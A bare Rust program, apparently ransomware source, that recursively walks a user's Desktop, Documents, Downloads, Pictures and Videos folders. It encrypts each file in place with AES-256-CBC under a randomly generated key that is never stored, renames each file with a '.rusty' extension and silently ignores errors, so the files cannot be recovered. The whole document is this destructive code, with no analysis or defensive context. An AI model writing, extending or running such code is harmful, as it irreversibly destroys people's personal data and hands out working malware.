use aes::Aes256;
use block_modes::{BlockMode, Cbc};
use block_modes::block_padding::Pkcs7;
use walkdir::WalkDir;
use rand::{Rng, thread_rng};
use rand::distributions::Standard;
use std::fs::{self, File};
use std::io::{Read, Write};
use std::path::PathBuf;
use std::convert::TryInto;

type EncCbc = Cbc<Aes256, Pkcs7>;

fn geniv() -> ([u8; 32], [u8; 16]) {
    let rng = thread_rng();
    let key: [u8; 32] = rng.sample_iter(&Standard).take(32).collect::<Vec<u8>>().try_into().unwrap();
    let iv: [u8; 16] = thread_rng().sample_iter(&Standard).take(16).collect::<Vec<u8>>().try_into().unwrap();
    (key, iv)
}

fn rfc(path: &PathBuf) -> std::io::Result<Vec<u8>> {
    let mut file = File::open(&path)?;
    let mut content = Vec::new();
    file.read_to_end(&mut content)?;
    Ok(content)
}

fn wec(path: &PathBuf, content: &[u8]) -> std::io::Result<()> {
    let mut file = File::create(&path)?;
    file.write_all(content)?;
    Ok(())
}

fn rnme(path: &PathBuf) -> std::io::Result<()> {
    let new_path = path.with_extension("rusty");
    fs::rename(path, new_path)?;
    Ok(())
}

fn encrio(path: &PathBuf, key: &[u8; 32], iv: &[u8; 16]) -> std::io::Result<()> {
    let content = rfc(path)?;
    let cipher = EncCbc::new_from_slices(key, iv).unwrap();
    let encrypted_content = cipher.encrypt_vec(&content);
    wec(path, &encrypted_content)?;
    rnme(path)?;
    Ok(())
}

fn main() -> std::io::Result<()> {
    let home_d = dirs::home_dir().expect("Nohome?");
    let dirs_to_enc = vec![
        home_d.join("Desktop"),
        home_d.join("Documents"),
        home_d.join("Downloads"),
        home_d.join("Pictures"),
        home_d.join("Videos"),
    ];
    let (key, iv) = geniv();
    let enc_fn = encrio as fn(&PathBuf, &[u8; 32], &[u8; 16]) -> std::io::Result<()>;
    for dir in dirs_to_enc {
        for entry in WalkDir::new(&dir).into_iter().filter_map(Result::ok).filter(|e| e.file_type().is_file()) {
            let path = entry.path().to_path_buf();
            if let Err(_) = enc_fn(&path, &key, &iv) {}
        }
    }
    Ok(())
}
